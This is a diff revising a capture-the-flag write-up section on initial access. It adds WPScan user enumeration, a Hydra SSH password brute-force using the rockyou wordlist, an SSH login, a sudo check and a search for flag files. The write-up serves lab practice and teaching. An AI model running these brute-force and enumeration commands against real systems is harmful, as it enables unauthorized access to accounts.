@@ -1,15 +1,14 @@
-
 # 02 - Initial Access
-
-## Objective
-
-Obtain a shell on the target machine.
-
----
 
 ## Username Enumeration
 
-Using WPScan, I discovered the following user.
+I enumerated the WordPress installation using WPScan.
+
+```bash
+wpscan --url http://<TARGET_IP>/wordpress -e u
+```
+
+The scan identified the following user.
 
 ```
 michael
@@ -17,61 +16,50 @@ michael
 
 ---
 
-## Credential Discovery
+## Password Attack
 
-After further enumeration, valid credentials were obtained.
+I used Hydra to perform an SSH brute-force attack.
 
-*(Document the method you used here if you want.)*
+```bash
+hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
+```
+
+Hydra successfully recovered Michael's password.
 
 ---
 
 ## SSH Login
 
-I connected to the target using SSH.
-
 ```bash
-ssh steven@<TARGET_IP>
+ssh michael@<TARGET_IP>
 ```
 
-After authentication, I obtained a shell as the user **steven**.
+I successfully logged in as **michael**.
 
 ---
 
-## System Enumeration
+## Sudo Enumeration
 
-To understand the environment, I executed:
+I checked Michael's sudo permissions.
 
 ```bash
-whoami
-hostname
-id
-pwd
+sudo -l
 ```
+
+Michael did **not** have sudo privileges.
 
 ---
 
 ## Flag 2
 
-I searched the filesystem for flags.
+I searched the filesystem.
 
 ```bash
 find / -type f -iname "*flag*" 2>/dev/null
 ```
 
-The second flag was located inside:
+The second flag was located in:
 
 ```
 /var/www
 ```
-
-### Screenshot
-
-
-
----
-
-## Summary
-
-* Logged in through SSH.
-* Obtained a shell as **steven**.
-* Located the second flag inside `/var/www`.
